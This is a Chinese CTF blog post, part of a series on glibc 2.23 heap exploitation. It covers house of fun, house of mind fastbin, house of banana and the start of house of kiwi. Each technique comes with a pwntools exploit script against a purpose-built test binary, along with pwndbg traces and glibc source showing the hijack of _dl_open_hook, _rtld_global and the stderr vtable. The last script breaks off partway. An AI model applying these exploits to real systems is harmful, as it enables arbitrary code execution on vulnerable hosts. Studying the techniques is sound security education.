---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其六
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其六

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-24 house of fun

本方法本质上属于large bin attack技术，large bin attack核心原理参考[glibc2.23其二](https://binracer.github.io/2025/11/15/pwn4heap-glibc2.23%E5%85%B6%E4%BA%8C)。不过，本方法通过利用_dl_open_hook布局one_gadget实现shell的控制权。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/13/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_fun/exploit.py)。

核心利用代码如下：

```python
# house of fun
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
magic = use_magic()
malloc(0, 0x18, b"A" * 0x8)
malloc(1, 0x720 - 0x8, b"B" * 0x8)
malloc(2, 0x18, b"C" * 0x8)
malloc(3, 0x710 - 0x8, b"D" * 0x8)
malloc(4, 0x18, b"E" * 0x8)
delete(3)
author_name, introduction, content = show(3)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"_dl_open_hook: {hex(libc.sym['_dl_open_hook'])}")
# Due to the complexities associated with satisfying one-gadget constraints in specific libc environments,
# I opt for the magic function as a more reliable alternative.
#
# one_gadget = libc.address + 0xCF70A
one_gadget = magic
log.info(f"one_gadget addr: {hex(one_gadget)}")
malloc(5, 0x800 - 0x8, b"F" * 0x8)
payload = p64(0) + p64(libc.sym["_dl_open_hook"] - 0x10)
edit(3, len(payload), payload)
delete(1)
malloc(6, 0x800 - 0x8, b"G" * 0x8)
payload = b"A" * 0x10 + p64(one_gadget)
edit(0, len(payload), payload)
delete(3)
conn.recvline()
cmd = b"cat src/2.23/house_of_fun/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先，连续申请chunks[0]、chunks[1]、chunks[2]、chunks[3]、chunks[4]内存，其中chunks[1]->size > chunks[3]->size，并且二者属于large bin范围。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55efba511000
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x55efba511020
Size: 0x720 (with flag bits: 0x721)

Allocated chunk | PREV_INUSE
Addr: 0x55efba511740
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x55efba511760
Size: 0x710 (with flag bits: 0x711)

Allocated chunk | PREV_INUSE
Addr: 0x55efba511e70
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x55efba511e90
Size: 0x20170 (with flag bits: 0x20171)

pwndbg> 
```

然后，释放chunks[3]至unsorted bin里，用来泄露libc地址。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x55efba511760 —▸ 0x70cd0eb8db78 (main_arena+88) ◂— 0x55efba511760
pwndbg> 
```

接着，申请chunks[5]内存，注意其size要大于chunks[3]。目的将chunks[3]从unsortedbin移动至largebins。

```bash
pwndbg> largebins 
largebins
0x700-0x730: 0x55efba511760 —▸ 0x70cd0eb8e028 (main_arena+1288) ◂— 0x55efba511760
pwndbg> 
pwndbg> x/12gx chunks
0x55efa64a20c0 <chunks>:        0x0000000000000018      0x000055efba511010
0x55efa64a20d0 <chunks+16>:     0x0000000000000718      0x000055efba511030
0x55efa64a20e0 <chunks+32>:     0x0000000000000018      0x000055efba511750
0x55efa64a20f0 <chunks+48>:     0x0000000000000708      0x000055efba511770
0x55efa64a2100 <chunks+64>:     0x0000000000000018      0x000055efba511e80
0x55efa64a2110 <chunks+80>:     0x00000000000007f8      0x000055efba511ea0
pwndbg> 
```

修改large bin的bk为`p64(libc.sym["_dl_open_hook"] - 0x10)`，其实修改bk_nextsize为`p64(libc.sym["_dl_open_hook"] - 0x20)`同样可以实现目的。

```bash
pwndbg> largebins 
largebins
0x700-0x730 [corrupted]
FD: 0x55efba511760 ◂— 0
BK: 0x55efba511760 —▸ 0x70cd0eb92330 (buffer+16) ◂— 0x2779b1e06af86f90
pwndbg> x/6gx 0x55efba511760
0x55efba511760: 0x0000000000000000      0x0000000000000711
0x55efba511770: 0x0000000000000000      0x000070cd0eb92330
0x55efba511780: 0x000055efba511760      0x000055efba511760
pwndbg> x/1gx &_dl_open_hook
0x70cd0eb92340 <_dl_open_hook>: 0x0000000000000000
pwndbg> 
```

接着释放chunks[1]至unsorted bin里。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x55efba511020 —▸ 0x70cd0eb8db78 (main_arena+88) ◂— 0x55efba511020
pwndbg> 
```

申请chunks[6]触发large bin attack。

```bash
pwndbg> x/1gx &_dl_open_hook
0x70cd0eb92340 <_dl_open_hook>: 0x000055efba511020
pwndbg> 
```

可以发现_dl_open_hook成功修改为chunks[2]地址。通过编辑chunks[0]，修改dl_open_hook结构体字段。

```bash
pwndbg> p/x *(struct dl_open_hook*)0x55efba511020
$1 = {
  dlopen_mode = 0x55efa649f8d5,
  dlsym = 0x721,
  dlclose = 0x55efba511760
}
pwndbg> x/6i 0x55efa649f8d5
   0x55efa649f8d5 <magic>:      endbr64
   0x55efa649f8d9 <magic+4>:    push   rbp
   0x55efa649f8da <magic+5>:    mov    rbp,rsp
   0x55efa649f8dd <magic+8>:    lea    rax,[rip+0x86f]        # 0x55efa64a0153
   0x55efa649f8e4 <magic+15>:   mov    rdi,rax
   0x55efa649f8e7 <magic+18>:   call   0x55efa649f180 <system@plt>
pwndbg> 
```

可以发现成功修改dlopen_mode函数指针为one_gadget。接着释放chunks[3]进入_int_free函数里errout。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3988
   3982         goto errout;
   3983       }
   3984     /* Or whether the block is actually not marked used.  */
   3985     if (__glibc_unlikely (!prev_inuse(nextchunk)))
   3986       {
   3987         errstr = "double free or corruption (!prev)";
 ► 3988         goto errout;
```

步进errout直至malloc_printerr函数。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3868
   3862       || __builtin_expect (misaligned_chunk (p), 0))
   3863     {
   3864       errstr = "free(): invalid pointer";
   3865     errout:
   3866       if (!have_lock && locked)
   3867         (void) mutex_unlock (&av->mutex);
 ► 3868       malloc_printerr (check_action, errstr, chunk2mem (p), av);
   3869       return;
```

步进malloc_printerr函数内，直至进入__libc_message函数。

```c
/* Abort with an error message.  */
void
__libc_message (int do_abort, const char *fmt, ...)
{
...
  if (do_abort)
    {
      BEFORE_ABORT (do_abort, written, fd);

      /* Kill the application.  */
      abort ();
    }
}

#define BEFORE_ABORT		backtrace_and_maps

static void
backtrace_and_maps (int do_abort, bool written, int fd)
{
  if (do_abort > 1 && written)
    {
      void *addrs[64];
#define naddrs (sizeof (addrs) / sizeof (addrs[0]))
      int n = __backtrace (addrs, naddrs);
      if (n > 2)
        {
#define strnsize(str) str, strlen (str)
#define writestr(str) write_not_cancel (fd, str)
          writestr (strnsize ("======= Backtrace: =========\n"));
          __backtrace_symbols_fd (addrs + 1, n - 1, fd);

          writestr (strnsize ("======= Memory map: ========\n"));
          int fd2 = open_not_cancel_2 ("/proc/self/maps", O_RDONLY);
          char buf[1024];
          ssize_t n2;
          while ((n2 = read_not_cancel (fd2, buf, sizeof (buf))) > 0)
            if (write_not_cancel (fd, buf, n2) != n2)
              break;
          close_not_cancel_no_status (fd2);
        }
    }
}
```

接着进入__backtrace函数内。

```c
int
__backtrace (void **array, int size)
{
  struct trace_arg arg = { .array = array, .cfa = 0, .size = size, .cnt = -1 };

  if (size <= 0)
    return 0;

#ifdef SHARED
  __libc_once_define (static, once);

  __libc_once (once, init);
  if (unwind_backtrace == NULL)
    return 0;
#endif

  unwind_backtrace (backtrace_helper, &arg);

  /* _Unwind_Backtrace seems to put NULL address above
     _start.  Fix it up here.  */
  if (arg.cnt > 1 && arg.array[arg.cnt - 1] == NULL)
    --arg.cnt;
  return arg.cnt != -1 ? arg.cnt : 0;
}
weak_alias (__backtrace, backtrace)
libc_hidden_def (__backtrace)
```

接着进入__libc_once，准备运行init函数。

```c
static void
init (void)
{
  libgcc_handle = __libc_dlopen ("libgcc_s.so.1");

  if (libgcc_handle == NULL)
    return;

  unwind_backtrace = __libc_dlsym (libgcc_handle, "_Unwind_Backtrace");
  unwind_getip = __libc_dlsym (libgcc_handle, "_Unwind_GetIP");
  if (unwind_getip == NULL)
    unwind_backtrace = NULL;
  unwind_getcfa = (__libc_dlsym (libgcc_handle, "_Unwind_GetCFA")
		  ?: dummy_getcfa);
}

#define __libc_dlopen(name) \
  __libc_dlopen_mode (name, RTLD_LAZY | __RTLD_DLOPEN)
```

可以发现libc此时使用__libc_dlopen打开`libgcc_s.so.1`，进入__libc_dlopen_mode函数内。

```c
void *
__libc_dlopen_mode (const char *name, int mode)
{
  struct do_dlopen_args args;
  args.name = name;
  args.mode = mode;
  args.caller_dlopen = RETURN_ADDRESS (0);

#ifdef SHARED
  if (__glibc_unlikely (_dl_open_hook != NULL))
    return _dl_open_hook->dlopen_mode (name, mode);
  return (dlerror_run (do_dlopen, &args) ? NULL : (void *) args.map);
#else
  if (dlerror_run (do_dlopen, &args))
    return NULL;

  __libc_register_dl_open_hook (args.map);
  __libc_register_dlfcn_hook (args.map);
  return (void *) args.map;
#endif
}
libc_hidden_def (__libc_dlopen_mode)
```

此时，可以清晰看到_dl_open_hook不为空，并且执行`_dl_open_hook->dlopen_mode (name, mode)`触发one_gadget。


### 1-25 house of mind fastbin

本方法利用non-main arena实现利用，要求的条件十分苛刻，而且利用不是非常稳定。此次，不再详细分析利用过程。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/15/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_mind_fastbin/exploit.py)。

核心利用代码如下：

```python
HEAP_MAX_SIZE = 0x4000000
MAX_SIZE = (128 * 1024) - 0x100

# house of mind fastbin
conn.sendafter(b"Enter author name: ", b"\x00" * 0x8)
fake_arena = b"\x00" * (0x880 - 0x28) + b"\xff\xff\xff" + b"\x00"
conn.sendafter(b"Enter introduction: ", fake_arena)
magic = use_magic()
log.info(f"magic addr: {hex(magic)}")
malloc(0, 0xF8, b"A" * 0x8)
malloc(1, 0xF8, b"B" * 0x8)
malloc(2, 0xF8, b"C" * 0x8)
malloc(3, 0xF8, b"D" * 0x8)
delete(0)
delete(2)
author_name, introduction, content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"_dl_open_hook: {hex(libc.sym['_dl_open_hook'])}")
one_gadget = magic
log.info(f"one_gadget addr: {hex(one_gadget)}")
payload = b"A" * 0x8 + b"A"
edit(0, len(payload), payload)
author_name, introduction, content = show(0)
chunk2_addr = u64(content[8 : 8 + 6].ljust(8, b"\x00")) - ord("A")
chunk3_addr = chunk2_addr + 0x100
log.info(f"chunk2 addr: {hex(chunk2_addr)}")
log.info(f"chunk3 addr: {hex(chunk3_addr)}")
payload = p64(main_arena88) + p64(chunk2_addr)
edit(0, len(payload), payload)
malloc(0, 0xF8, b"A" * 0x8)
malloc(2, 0xF8, b"C" * 0x8)


new_arena_value = (chunk3_addr + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1)
fake_heap_info = new_arena_value
log.info(f"new_arena_value addr: {hex(new_arena_value)}")
log.info(f"fake_heap_info addr: {hex(fake_heap_info)}")
malloc(4, MAX_SIZE, b"\x00" * 0x8)
chunk4_addr = chunk3_addr + 0x100
quotient = int((new_arena_value - chunk4_addr) / (MAX_SIZE + 0x10))
remainder = int((new_arena_value - chunk4_addr) % (MAX_SIZE + 0x10))
log.info(f"quotient : {hex(quotient)}")
log.info(f"remainder : {hex(remainder)}")
for _ in range(quotient):
    malloc(4, MAX_SIZE, b"E" * 0x8)

chunk4_addr = chunk4_addr + (quotient * (MAX_SIZE + 0x10))
log.info(f"chunk4 addr: {hex(chunk4_addr)}")
malloc(5, MAX_SIZE, b"F" * 0x8)
chunk5_addr = chunk4_addr + (MAX_SIZE + 0x10)
log.info(f"chunk5 addr: {hex(chunk5_addr)}")

malloc(6, 0x40, b"G" * 0x8)
chunk6_addr = chunk5_addr + (MAX_SIZE + 0x10)
log.info(f"chunk6 addr: {hex(chunk6_addr)}")
malloc(7, 0x40, b"H" * 0x8)
chunk7_addr = chunk6_addr + 0x40 + 0x10
log.info(f"chunk7 addr: {hex(chunk7_addr)}")

payload = b"E" * (remainder - 0x10) + p64(magic - 0x20)
edit(4, len(payload), payload)
payload = b"G" * 0x40 + p64(0) + p64(0x50 | 0x4)
edit(6, len(payload), payload)
delete(7)
conn.sendlineafter(b"> ", str(0x4D41474943).encode())
conn.sendline(str(chunk7_addr).encode())
conn.interactive()
cmd = b"cat src/2.23/house_of_mind_fastbin/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

成功利用结果如下：

```bash
[*] magic addr: 0x572a4bbe4080
[*] main_arena+88: 0x779f3e58db78
[*] _dl_open_hook: 0x779f3e592340
[*] one_gadget addr: 0x572a4bbe4080
[*] one_gadget addr: 0x572a4bbe4080
[*] chunk2 addr: 0x572a84718200
[*] chunk3 addr: 0x572a84718300
[*] new_arena_value addr: 0x572a88000000
[*] fake_heap_info addr: 0x572a88000000
[*] quotient : 0x1c8
[*] remainder : 0x2780
[*] chunk4 addr: 0x572a87ffd880
[*] chunk5 addr: 0x572a8801d790
[*] chunk6 addr: 0x572a8803d6a0
[*] chunk7 addr: 0x572a8803d6f0
[*] Switching to interactive mode
$ id
uid=1000(bogon) gid=1000(bogon) groups=1000(bogon)
$
```

### 1-26 house of banana

本方法是一种针对动态链接运行时环境的高级利用技术，其核心机理在于篡改动态链接器（ld.so）中的关键全局数据结构_rtld_global，并构造恶意的link_map条目。通过伪造link_map结构体，能够操纵动态链接过程中的符号解析与库加载例程，从而劫持控制流或实现任意代码执行。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/16/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_banana/exploit.py)。

核心利用代码如下：

```python
# house of banana
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
magic = use_magic()
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
_rtld_global = libc.address + 0x622040
link_map0 = _rtld_global
link_map1 = _rtld_global + 0x16C0
# Due to the complexities associated with satisfying one-gadget constraints in specific libc environments,
# I opt for the magic function as a more reliable alternative.
#
# one_gadget = libc.address + 0xCF70A
one_gadget = magic
log.info(f"libc base: {hex(libc.address)}")
log.info(f"_rtld_global addr: {hex(_rtld_global)}")
log.info(f"link_map0 addr: {hex(link_map0)}")
log.info(f"link_map1 addr: {hex(link_map1)}")
log.info(f"one_gadget addr: {hex(one_gadget)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_rtld_global - 0x10)
payload += p64(chunk0_addr) + p64(_rtld_global - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

link_map = p64(0) + p64(link_map1)  # l_ld | l_next
link_map += p64(0) + p64(chunk2_addr)  # l_prev | l_real
link_map += p64(0) + p64(0)  # l_ns | l_libname
link_map += p64(0) * 26
link_map += p64(chunk2_addr + (2 + 2 + 2 + 2 + 26) * 8)  # l->l_info[26] DT_FINI_ARRAY
link_map += p64(chunk2_addr + (2 + 2 + 2 + 2 + 26) * 8 + 0x20)  # l->l_info[DT_FINI_ARRAY]->d_un.d_ptr
link_map += p64(chunk2_addr + (2 + 2 + 2 + 2 + 26) * 8 + 0x10)  # l->l_info[DT_FINI_ARRAYSZ]
link_map += p64(8)  # i=l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
link_map += p64(one_gadget)
link_map += p64(0) * 59
link_map += p64(0x800000000)  # l_init_called = 1
edit(2, len(link_map), link_map)
exit_proc()
conn.recvline()
cmd = b"cat src/2.23/house_of_banana/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先，连续申请chunks[0]、chunks[1]、chunks[2]内存，其中chunks[0]->size > chunks[2]->size。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5bf9411da000
Size: 0x430 (with flag bits: 0x431)

Allocated chunk | PREV_INUSE
Addr: 0x5bf9411da430
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x5bf9411da940
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE
Addr: 0x5bf9411dad50
Size: 0x202b0 (with flag bits: 0x202b1)

pwndbg> 
```

然后，释放chunks[0]至unsorted bin里。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x5bf9411da000 —▸ 0x704e4bb8db78 (main_arena+88) ◂— 0x5bf9411da000
pwndbg> 
```

接着，申请chunks[3]内存，将chunks[0]从unsortedbin转移到largebins里。其中，要求chunks[3]->size > chunks[0]->size。此时可以泄露libc地址和heap地址，为后续的布局做好准备。

```bash
pwndbg> largebins 
largebins
0x400-0x430: 0x5bf9411da000 —▸ 0x704e4bb8df68 (main_arena+1096) ◂— 0x5bf9411da000
pwndbg> 
```

接着释放chunks[2]至unsorted bin里。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x5bf9411da940 —▸ 0x704e4bb8db78 (main_arena+88) ◂— 0x5bf9411da940
pwndbg> 
```

修改large bin的bk为`p64(_rtld_global - 0x10)`，bk_nextsize为`p64(_rtld_global - 0x20)`。

```bash
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x5bf9411da000 —▸ 0x704e4bb8df68 (main_arena+1096) ◂— 0x5bf9411da000
BK: 0x5bf9411da000 —▸ 0x704e4be22030 (realloc@got[plt]) ◂— 4
pwndbg> x/6gx 0x5bf9411da000
0x5bf9411da000: 0x0000000000000000      0x0000000000000431
0x5bf9411da010: 0x0000704e4bb8df68      0x0000704e4be22030
0x5bf9411da020: 0x00005bf9411da000      0x0000704e4be22020
pwndbg> x/1gx &_rtld_global
0x704e4be22040 <_rtld_local>:   0x0000704e4be23168
pwndbg> 
```

申请chunks[4]触发large bin attack。

```bash
pwndbg> x/1gx &_rtld_global
0x704e4be22040 <_rtld_local>:   0x00005bf9411da940
pwndbg> p/x chunks[2]
$1 = {
  size = 0x400,
  addr = 0x5bf9411da950
}
pwndbg> 
```

可以发现_rtld_global成功修改为chunks[2]。在chunks[2]内布局fake link_map。

```bash
pwndbg> p/x *(struct link_map*)0x00005bf9411da940
$2 = {
  l_addr = 0x0,
  l_name = 0x411,
  l_ld = 0x0,
  l_next = 0x704e4be23700,
  l_prev = 0x0,
  l_real = 0x5bf9411da940,
  l_ns = 0x0,
  l_libname = 0x0,
  l_info = {0x0 <repeats 26 times>, 0x5bf9411daa50, 0x5bf9411daa70, 0x5bf9411daa60, 0x8, 0x5bf9012a8779, 0x0 <repeats 45 times>},
  l_phdr = 0x0,
  l_entry = 0x0,
  l_phnum = 0x0,
  l_ldnum = 0x0,
  l_searchlist = {
    r_list = 0x0,
    r_nlist = 0x0
  },
  l_symbolic_searchlist = {
    r_list = 0x0,
    r_nlist = 0x0
  },
  l_loader = 0x0,
  l_versions = 0x0,
  l_nversions = 0x0,
  l_nbuckets = 0x0,
  l_gnu_bitmask_idxbits = 0x0,
  l_gnu_shift = 0x0,
  l_gnu_bitmask = 0x0,
  {
    l_gnu_buckets = 0x0,
    l_chain = 0x0
  },
  {
    l_gnu_chain_zero = 0x0,
    l_buckets = 0x0
  },
  l_direct_opencount = 0x0,
  l_type = 0x0,
  l_relocated = 0x0,
  l_init_called = 0x1,
  l_global = 0x0,
  l_reserved = 0x0,
  l_phdr_allocated = 0x0,
  l_soname_added = 0x0,
  l_faked = 0x0,
  l_need_tls_init = 0x0,
  l_auditing = 0x0,
  l_audit_any_plt = 0x0,
  l_removed = 0x0,
  l_contiguous = 0x0,
  l_symbolic_in_local_scope = 0x0,
  l_free_initfini = 0x0,
  l_rpath_dirs = {
    dirs = 0x0,
    malloced = 0x0
  },
  l_reloc_result = 0x0,
  l_versyms = 0x0,
  l_origin = 0x0,
  l_map_start = 0x0,
  l_map_end = 0x0,
  l_text_end = 0x0,
  l_scope_mem = {0x0, 0x0, 0x0, 0x0},
  l_scope_max = 0x0,
  l_scope = 0x0,
  l_local_scope = {0x0, 0x0},
  l_file_id = {
    dev = 0x0,
    ino = 0x0
  },
  l_runpath_dirs = {
    dirs = 0x0,
    malloced = 0x0
  },
  l_initfini = 0x0,
  l_reldeps = 0x0,
  l_reldepsmax = 0x0,
  l_used = 0x0,
  l_feature_1 = 0x0,
  l_flags_1 = 0x0,
  l_flags = 0x0,
  l_idx = 0x0,
  l_mach = {
    plt = 0x0,
    gotplt = 0x0,
    tlsdesc_table = 0x0
  },
  l_lookup_cache = {
    sym = 0x0,
    type_class = 0x0,
    value = 0x0,
    ret = 0x410
  },
  l_tls_initimage = 0x510,
  l_tls_initimage_size = 0x0,
  l_tls_blocksize = 0x0,
  l_tls_align = 0x0,
  l_tls_firstbyte_offset = 0x0,
  l_tls_offset = 0x0,
  l_tls_modid = 0x0,
  l_tls_dtor_count = 0x0,
  l_relro_addr = 0x0,
  l_relro_size = 0x0,
  l_serial = 0x0,
  l_audit = 0x5bf9411dadb0
}
pwndbg> p/x ((struct link_map*)0x00005bf9411da940)->l_info[26]
$3 = 0x5bf9411daa50
pwndbg> p/x *(Elf64_Dyn*)0x5bf9411daa50
$4 = {
  d_tag = 0x5bf9411daa50,
  d_un = {
    d_val = 0x5bf9411daa70,
    d_ptr = 0x5bf9411daa70
  }
}
pwndbg> p/x ((struct link_map*)0x00005bf9411da940)->l_info[28]
$5 = 0x5bf9411daa60
pwndbg> p/x *(Elf64_Dyn*)0x5bf9411daa60
$6 = {
  d_tag = 0x5bf9411daa60,
  d_un = {
    d_val = 0x8,
    d_ptr = 0x8
  }
}
pwndbg> x/1gx 0x5bf9411daa70
0x5bf9411daa70: 0x00005bf9012a8779
pwndbg> x/6i 0x00005bf9012a8779
   0x5bf9012a8779 <magic>:      endbr64
   0x5bf9012a877d <magic+4>:    push   rbp
   0x5bf9012a877e <magic+5>:    mov    rbp,rsp
   0x5bf9012a8781 <magic+8>:    lea    rax,[rip+0x949]        # 0x5bf9012a90d1
   0x5bf9012a8788 <magic+15>:   mov    rdi,rax
   0x5bf9012a878b <magic+18>:   call   0x5bf9012a8180 <system@plt>
pwndbg> 
```

退出程序，触发_dl_fini函数调用。

```c
void
internal_function
_dl_fini (void)
{
...
#ifdef SHARED
  int do_audit = 0;
 again:
#endif
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));

      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
      /* No need to do anything for empty namespaces or those used for
	 auditing DSOs.  */
      if (nloaded == 0
#ifdef SHARED
	  || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit
#endif
	  )
	__rtld_lock_unlock_recursive (GL(dl_load_lock));
      else
	{
	  /* Now we can allocate an array to hold all the pointers and
	     copy the pointers in.  */
	  struct link_map *maps[nloaded];

	  unsigned int i;
	  struct link_map *l;
	  assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);
	  for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
	    /* Do not handle ld.so in secondary namespaces.  */
	    if (l == l->l_real)
	      {
		assert (i < nloaded);

		maps[i] = l;
		l->l_idx = i;
		++i;

		/* Bump l_direct_opencount of all objects so that they
		   are not dlclose()ed from underneath us.  */
		++l->l_direct_opencount;
	      }
	  assert (ns != LM_ID_BASE || i == nloaded);
	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);
	  unsigned int nmaps = i;

	  /* Now we have to do the sorting.  */
	  _dl_sort_fini (maps, nmaps, NULL, ns);

	  /* We do not rely on the linked list of loaded object anymore
	     from this point on.  We have our own list here (maps).  The
	     various members of this list cannot vanish since the open
	     count is too high and will be decremented in this loop.  So
	     we release the lock so that some code which might be called
	     from a destructor can directly or indirectly access the
	     lock.  */
	  __rtld_lock_unlock_recursive (GL(dl_load_lock));

	  /* 'maps' now contains the objects in the right order.  Now
	     call the destructors.  We have to process this array from
	     the front.  */
	  for (i = 0; i < nmaps; ++i)
	    {
	      struct link_map *l = maps[i];

	      if (l->l_init_called)
		{
		  /* Make sure nothing happens if we are called twice.  */
		  l->l_init_called = 0;

		  /* Is there a destructor function?  */
		  if (l->l_info[DT_FINI_ARRAY] != NULL
		      || l->l_info[DT_FINI] != NULL)
		    {
		      /* When debugging print a message first.  */
		      if (__builtin_expect (GLRO(dl_debug_mask)
					    & DL_DEBUG_IMPCALLS, 0))
			_dl_debug_printf ("\ncalling fini: %s [%lu]\n\n",
					  DSO_FILENAME (l->l_name),
					  ns);

		      /* First see whether an array is given.  */
		      if (l->l_info[DT_FINI_ARRAY] != NULL)
			{
			  ElfW(Addr) *array =
			    (ElfW(Addr) *) (l->l_addr
					    + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
			  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
					    / sizeof (ElfW(Addr)));
			  while (i-- > 0)
			    ((fini_t) array[i]) ();
			}
...
}
```

其中`((fini_t) array[i]) ();`触发one_gadget，获取shell的完全控制权。


### 1-27 house of kiwi其一

本方法利用方式与前面的house of orange类似，都是Heap+IO结合利用。不过，本方法通过伪造stderr->vtable实现利用，而libc的触发点也变为`__malloc_assert 》 _IO_fflush 》 _IO_SYNC`。

```c
int
_IO_fflush (_IO_FILE *fp)
{
  if (fp == NULL)
    return _IO_flush_all ();
  else
    {
      int result;
      CHECK_FILE (fp, EOF);
      _IO_acquire_lock (fp);
      result = _IO_SYNC (fp) ? EOF : 0;
      _IO_release_lock (fp);
      return result;
    }
}
libc_hidden_def (_IO_fflush)
```

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/16/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_kiwi/exploit.py)。

核心利用代码如下：

```python
# house of kiwi
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
magic = use_magic()
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
# Due to the complexities associated with satisfying one-gadget constraints in specific libc environments,
# I opt for the magic function as a more reliable alternative.
#
# one_gadget = libc.address + 0xCF70A
one_gadget = magic
log.info(f"one_gadget addr: {hex(one_gadget)}")
stderr = libc.address + 0x38E560
log.info(f"stderr addr: {hex(stderr)}")
vtable = stderr + 0xD8
log.info(f"vtable addr: {hex(vtable)}")
__xsputn = libc.address + 0x6BCFB
log.info(f"__xsputn addr: {hex(__xsputn)}")
__overflow = libc.address + 0x6CA11
log.info(f"__overflow addr: {hex(__overflow)}")
__write = libc.address + 0x6BC56
log.info(f"__write addr: {hex(__write)}")


payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(vtable - 0x10)
payload += p64(chunk0_addr) + p64(vtable - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

# (__overflow | __xsputn | __write) just for bypass __fxprintf check
payload = b"\x00" * (0x18 - 0x10) + p64(__overflow)
payload = payload.ljust(0x38 - 0x10, b"\x00") + p64(__xsputn)
payload = payload.ljust(0x60 - 0x10, b"\x00") + p64(one_gadget)
payload = payload.ljust(0x78 - 0x10, b"\x00") + p64(__write)
edit(2, len(payload), payload)
payload = b"\x00" * 0x500 + p64(0) + p64(0x1000)
edit(4, len(payload), payload)
